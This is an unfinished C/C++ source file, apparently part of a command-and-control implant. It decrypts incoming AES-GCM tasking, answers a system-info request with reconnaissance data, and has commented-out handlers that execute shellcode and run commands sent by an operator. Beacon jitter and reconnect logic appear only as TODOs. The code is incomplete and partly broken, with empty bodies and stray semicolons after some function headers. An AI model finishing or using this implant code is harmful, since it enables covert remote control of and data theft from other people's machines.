/* MessageHandler.cpp */

#include "MessageTypes.h"
#include "MessagePublisher.h"
#include "recon.h"


// this function processes the header of the message
// to determine how to interpet the contents/data of 
// the message. 
//int processMessage(BYTE* payload, MessageHeader* header)
// int processIncomingMessage(InternalMessage* msg, Config* config)
int processMessage(InternalMessage* msg, Config* config) // NOTE: passing the config around is actual cancer... i wish i was writing this in c++
{
	switch (msg->header.messageType) {
		case SYSTEM_INFO:
		{
			ReconMessage reconMessage;
			int status = generateReconMessage(&reconMessage);

			// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
			InternalMessage* response = malloc(sizeof(InternalMessage));
			memcpy(response->payload, &reconMessage, sizeof(ReconMessage));
			response->header.payload_size = sizeof(ReconMessage);
			//return send(msg->header.message_id);
			status |= send(response, config);
			return status;
		}

		/*
		case MSG_TYPE_SHELLCODE:
			return ExecuteShellcode(payload, header->payload_size);

		case MSG_TYPE_CMD:
			return ExecuteCommand((char*)payload, header->payload_size);
		*/

		// ... other cases
	}
	return 0;
}


//int receiveMessages(Config* config, FuncRecv pRecv) // TODO: figure out if passing pRecv is the best way to do this
//bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received, Config& config)
bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received)
{
	// TODO: replace 'true' with a condition
	while (true) // TODO: change to var... while tcp connection is valid/established/successful
	{
		// TODO: socket stuff

		// MessageConsumer::handle(message); // TODO: this is c++... convert to c
		// if there's incoming commands...

		// TODO: should probs def move this pRecv logic somewhere else maybe in MessageConsumer? 
		// so thorough validiating and error checks can be done on the data. stuff like making sure message isn't empty
		// and is a valid MessageType and what not
		//unsigned char buffer[4096]; // TODO: type should be uint8_t?
		//int bytes_received = pRecv(config->sock, (char*)buffer, 4096, 0);

        InternalMessage resultMsg; // TODO: this needs to be initialized/allocated to be 0/NULL
		handleTCP(buffer, bytes_received, &resultMsg, config); // maybe rename to handleTCPInbound?

		//publisher
        send(&resultMsg, config); // TODO: check return value for errors



        // if heartbeat interval elapsed... 
        // sendMessage(MessageType HEARTBEAT) // TODO: this should be the first thing checked? heartbeat timer should be reset anytime a message is received?

		// sleepWithJitter()

		// if connection is lost, attempt to reconnect... maybe do this logic somewhere else?
	}

	return false; // if no errors, return 0
}
int handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg, Config* config)
{
	// Raw Bytes from Socket
	uint8_t buf[4096]; // TODO: rename to plaintext?

	// DECRYPT -> Decrypted Bytes
	// [IV (12 bytes - cleartext)][Ciphertext (encrypted)][Tag (16 bytes - cleartext)]
	const uint8_t* iv = rawData;
	const uint8_t* ciphertext = rawData + 12;
	size_t ciphertext_len = rawDataLength - 12 - 16;
	const uint8_t* tag = rawData + 12 + ciphertext_len;
	int decrypted_size = decrypt_aes_256_gcm(ciphertext, ciphertext_len, config->crypto_key, iv, tag, buf); // TODO: decrypted_size

	// check if length(buf) is at least the sizeof(MessageHeader), otherwise throw error
	// parseHeader()
	// check if sizeof(MessageHeader) + header->payloadSize == decrypted_size, otherwise throw error

	// DESERIALIZE -> InternalMessage 
	// check length(plaintext) == sizeof(InternalMessage)
    // const InternalMessage* msg = (const InternalMessage*)plaintext;
	// VALIDATE
    // size_t expected_size = offsetof(InternalMessage, data) + msg->data_len;
    // check length(plaintext) == expected_size

	InternalMessage* msg = (InternalMessage*)buf;

	// EXECUTE (InternalMessage)
	// call function based on InternalMessage
	//processMessage(msg->payload, msg->header); // TODO: check return type for errors?
	processMessage(msg, config);

	// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
	//InternalMessage* response = malloc(sizeof(InternalMessage));
	//memcpy(response->payload, &recon, sizeof(ReconData));
	//response->header.payload_size = sizeof(ReconData);

	// TODO: cleanup/free buf
}
int handleHTTPS(uint8_t* data)
{
	// HTTPS Text Message

	// PARSE HTTP HEADERS

	// EXTRACT JSON BODY

	// EXTRACT BASE64 FIELD

	// BASE64 DECODE -> Raw Bytes

	// DECRYPT -> Decrypted Bytes

	// DESERIALIZE -> InternalMessage

	// VALIDATE

	// EXECUTE (InternalMessage)

}


int compressData(uint8_t* buf) 
{

}

///////////////////////


/*
MessageHandler::MessageHandler(
            CompressorUniquePtr compressorPtr,
            EncrypterUniquePtr encrypterPtr,
            EncoderUniquePtr encoderPtr,
            SerializerUniquePtr serializerPtr,
            Config* config) :
          	compressorPtr_(compressorPtr),
            encrypterPtr_(encrypterPtr),
            encoderPtr_(encoderPtr),
            serializerPtr_(serializerPtr),
            config_(config)
{}*/
//MessageHandler::MessageHandler(C2Profile& config) {}

    
bool MessageHandler::sendMessage(); // overload this function?
{
	// TODO: where does parsing go in this? (if it's even needed)

	// InternalMessage
	// Validate
	// Serialize
	// Encode
	// Compress
	// Encrypt
	// Frame (if needed)
	// Raw Bytes
	// Send
}

// TODO: setup a listener function that calls this function?
// listener function simply calls recv and handles socket stuff?
// recvMessage would just serve as a wrapper for that maybe?
bool MessageHandler::recvMessage(); // overload this function?
{
	// TODO: where does parsing go in this? (if it's even needed)

	// Recv
	// Raw Bytes
	// Decrypt
	// Decode
	// Deserialize
	// Obtain InternalMessage object
	// Validate
	// handle InternalMessage (based on its header)
}
